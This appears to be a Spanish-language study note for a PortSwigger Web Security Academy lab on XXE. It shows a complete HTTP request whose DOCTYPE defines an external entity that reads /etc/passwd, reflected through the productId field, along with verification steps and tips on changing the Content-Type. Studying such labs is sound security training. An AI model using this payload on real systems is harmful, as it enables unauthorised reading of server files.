---
aliases:
  - XXE - leer archivo in-band
  - xxe in-band file read
  - leer etc passwd xxe
tags:
  - vuln/xxe
  - example
  - portswigger
---

# Ejemplo — Leer un archivo in-band (entidad externa reflejada)

> Lab: [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) · **Apprentice** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

**Qué demuestra:** el caso más simple. Controlás el XML entero → definís una **entidad externa** con `SYSTEM "file://…"` y la referenciás donde el valor **se refleja** en la respuesta. El contenido del archivo vuelve en el mensaje de stock.

## Vector completo

**Request vulnerable** — el "Check stock" manda XML (ojo al `Content-Type`):

```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml
Content-Length: 134

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

- El `<!DOCTYPE …>` va **entre** la declaración `<?xml?>` y el `<stockCheck>`.
- `&xxe;` reemplaza el valor de `productId` (el campo que se refleja). La respuesta trae el `/etc/passwd` donde iría el error de "producto inválido".

## Verificación
La respuesta incluye el contenido del archivo (`root:x:0:0:...`). Si no refleja → no es in-band: pasá a [[vulnerabilities/006-xxe/examples/xxe-ciego-callback-oob|XXE ciego]].

## Detalles que se pasan por alto
- **`Content-Type` XML.** El body es XML. Si el lab lo manda como `application/x-www-form-urlencoded` con un body XML, suele parsearse igual; si un endpoint **no** parece XML, probá **cambiar el `Content-Type` a `application/xml`** y mandar XML — a veces recién ahí parsea.
- **Reemplazá el campo reflejado**, no cualquiera. `productId` es el que vuelve en el error; `storeId` no.
- Escaped correcto: acá **no** hace falta escapar nada (entidad general simple).
